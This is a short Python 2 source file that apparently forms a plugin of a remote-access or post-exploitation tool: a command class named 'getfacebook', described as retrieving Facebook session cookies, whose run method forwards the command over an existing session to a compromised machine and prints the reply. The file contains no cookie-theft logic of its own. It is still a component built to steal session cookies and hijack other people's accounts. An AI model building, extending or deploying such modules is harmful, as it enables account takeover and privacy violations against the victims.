class command:
    def __init__(self):
        self.name = "getfacebook"
        self.description = "retrieve facebook session cookies"

    def run(self,session,cmd_data):
        print session.send_command(cmd_data)
